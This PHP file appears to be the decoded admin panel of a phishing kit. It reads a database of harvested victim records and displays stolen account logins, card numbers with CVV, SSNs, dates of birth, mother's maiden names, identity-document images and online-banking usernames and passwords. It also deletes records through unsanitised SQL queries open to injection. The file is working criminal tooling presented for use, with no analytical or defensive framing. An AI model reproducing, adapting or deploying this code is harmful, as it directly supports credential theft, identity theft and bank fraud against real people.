<?php
// Decoded by Girudatsu.com Member

$y___d_IQLK = 'header';
$FFJ_obwEnodfF = 'is_numeric';
$QueZGvtS = 'explode';
$YqFyUnRClxYNe = 'strtoupper';
@session_start();
if (!isset($_SESSION['login_success'])) {
    @header('Location: ../index.php');
    exit;
}
$pdo = new PDO('sqlite:database.db');
if ($pdo) {
    if (isset($_POST['xdelete'])) {
        $xdelete = $_POST['xdelete'];
        $pdo->query('' . 'DELETE FROM `accounts` WHERE `id`=\'' . "{$xdelete}" . '\'' . '');
        $pdo->query('' . 'DELETE FROM `creditcards` WHERE `owner_id`=\'' . "{$xdelete}" . '\'' . '');
        $pdo->query('' . 'DELETE FROM `bank` WHERE `owner_id`=\'' . "{$xdelete}" . '\'' . '');
        $pdo->query('' . 'DELETE FROM `identity` WHERE `owner_id`=\'' . "{$xdelete}" . '\'' . '');
        echo 'done';
    } elseif (isset($_GET['FULL_INFO'])) {
        $FULL_INFO = $_GET['FULL_INFO'];
        if (!is_numeric($FULL_INFO)) {
            echo 'Error!';
            exit;
        }
        $accounts = $pdo->query('' . 'SELECT * FROM `accounts` WHERE `id`=\'' . "{$FULL_INFO}" . '\'' . '')->fetch(PDO::FETCH_ASSOC);
        $credit_cards = $pdo->query('' . 'SELECT * FROM `creditcards` WHERE `owner_id`=\'' . "{$FULL_INFO}" . '\'' . '')->fetch(PDO::FETCH_ASSOC);
        $bank_account = $pdo->query('' . 'SELECT * FROM `bank` WHERE `owner_id`=\'' . "{$FULL_INFO}" . '\'' . '')->fetch(PDO::FETCH_ASSOC);
        $identity = $pdo->query('' . 'SELECT * FROM `identity` WHERE `owner_id`=\'' . "{$FULL_INFO}" . '\'' . '')->fetch(PDO::FETCH_ASSOC);
        if ($identity) {
            $single_identity = explode('*_*', $identity['identities']);
        }
        ?>
<body style="background-color:#fff;"><pre style="background-color:#fff;color:#14566C;">
<font style="color:#C62241;">ACC---------------------------------------------</font><?php
        echo chr(10);
        ?>
<font style="color:#000;">Username:</font> <?php
        echo $accounts['username'] . chr(10);
        ?>
<font style="color:#000;">Password:</font> <?php
        echo $accounts['password'] . chr(10);
        ?>
<font style="color:#000;">IP Address:</font> <?php
        echo $accounts['ip'] . chr(10);
        ?>
<font style="color:#000;">Browser:</font> <?php
        echo $accounts['browser'] . chr(10);
        ?>
<font style="color:#000;">Sys Language:</font> <?php
        echo $accounts['account_language'] . chr(10);
        ?>
<font style="color:#000;">O.System:</font> <?php
        echo $accounts['os'] . ', ' . $accounts['platform'] . chr(10);
        ?>
<font style="color:#000;">Date & Time:</font> <?php
        echo strtoupper($accounts['date_time']) . chr(10);
        ?>
 (Server Side)
<font style="color:#000;">Time Zone:</font> <?php
        echo $accounts['timezone'] . chr(10);
        ?>
<font style="color:#000;">Resolution:</font> <?php
        echo $accounts['resolution'] . chr(10);
        ?>
<font style="color:#000;">User Agent:</font> <?php
        echo $accounts['useragent'] . chr(10);
        ?>
<font style="color:#000;">Location:</font> <?php
        echo $accounts['location'] . chr(10);
        $y___d_IQLK = 'header';
        $FFJ_obwEnodfF = 'is_numeric';
        $QueZGvtS = 'explode';
        $YqFyUnRClxYNe = 'strtoupper';
        if ($identity) {
            ?>
<font style="color:#000;">Identities:</font>  <?php
            $y___d_IQLK = 'header';
            $FFJ_obwEnodfF = 'is_numeric';
            $QueZGvtS = 'explode';
            $YqFyUnRClxYNe = 'strtoupper';
            foreach ($single_identity as $value) {
                if ($value != '') {
                    echo '' . '<a href=\'' . "{$value}" . '\' target=\'_blank\'><img class=\'identities\' src=\'' . "{$value}" . '\'></a>' . '';
                }
            }
            ?>
<font style="color:#000;">Document Type:</font> <?php
            echo $identity['document_type'] . chr(10);
            $y___d_IQLK = 'header';
            $FFJ_obwEnodfF = 'is_numeric';
            $QueZGvtS = 'explode';
            $YqFyUnRClxYNe = 'strtoupper';
        }
        ?>
<font style="color:#C62241;">CC---------------------------------------------</font><?php
        echo chr(10);
        ?>
<font style="color:#000;">Card Number:</font> <?php
        echo $credit_cards['cc'] . chr(10);
        ?>
<font style="color:#000;">Expire Date:</font> <?php
        echo $credit_cards['exp'] . chr(10);
        ?>
<font style="color:#000;">CVV/CVV2:</font> <?php
        echo $credit_cards['cvv'] . chr(10);
        ?>
<font style="color:#000;">Full Address:</font> <?php
        echo $accounts['address'] . chr(10);
        ?>
<font style="color:#000;">Card Name:</font> <?php
        echo $credit_cards['cardname'] . chr(10);
        ?>
<font style="color:#000;">Card Type:</font> <?php
        echo $credit_cards['type'] . chr(10);
        ?>
<font style="color:#000;">Card Level:</font> <?php
        echo $credit_cards['level'] . chr(10);
        ?>
<font style="color:#000;">Bank Name:</font> <?php
        echo $credit_cards['bank_name'] . chr(10);
        ?>
<font style="color:#000;">Bank Country:</font> <?php
        echo $credit_cards['bank_country'] . chr(10);
        ?>
<font style="color:#000;">Bank Website:</font> <?php
        echo $credit_cards['bank_website'] . chr(10);
        ?>
<font style="color:#000;">Bank Phone:</font> <?php
        echo $credit_cards['bank_phone'] . chr(10);
        ?>
<font style="color:#C62241;">VBV---------------------------------------------</font><?php
        echo chr(10);
        ?>
<font style="color:#000;">Card Holder:</font> <?php
        echo $credit_cards['vbv_holder'] . chr(10);
        ?>
<font style="color:#000;">Date of Birth:</font> <?php
        echo $credit_cards['vbv_dob'] . chr(10);
        ?>
<font style="color:#000;">Phone Number:</font> +<?php
        echo $credit_cards['phone_number'] . chr(10);
        ?>
<font style="color:#000;">Social Security Number:</font> <?php
        echo $credit_cards['vbv_ssn'] . chr(10);
        ?>
<font style="color:#000;">Mother's Middle Name:</font> <?php
        echo $credit_cards['vbv_mmn'] . chr(10);
        ?>
<font style="color:#000;">Account Number:</font> <?php
        echo $credit_cards['acc_num'] . chr(10);
        ?>
<font style="color:#000;">Sort Code:</font> <?php
        echo $credit_cards['vbv_sort'] . chr(10);
        ?>
<font style="color:#C62241;">BNK---------------------------------------------</font><?php
        echo chr(10);
        ?>
<font style="color:#000;">Bank Name:</font> <?php
        echo $bank_account['bank_name'] . chr(10);
        ?>
<font style="color:#000;">Username:</font> <?php
        echo $bank_account['username'] . chr(10);
        ?>
<font style="color:#000;">Password:</font> <?php
        echo $bank_account['password'] . chr(10);
        ?>
<font style="color:#000;">Account Type:</font> <?php
        echo $bank_account['checking_or_savings'] . chr(10);
        ?>
<font style="color:#000;">Routing Number:</font> <?php
        echo $bank_account['routing_number'] . chr(10);
        ?>
<font style="color:#000;">Account Number:</font> <?php
        echo $bank_account['account_number'] . chr(10);
        ?>
<font style="color:#C62241;">END---------------------------------------------</font><?php
        echo chr(10);
        $y___d_IQLK = 'header';
        $FFJ_obwEnodfF = 'is_numeric';
        $QueZGvtS = 'explode';
        $YqFyUnRClxYNe = 'strtoupper';
    }
}
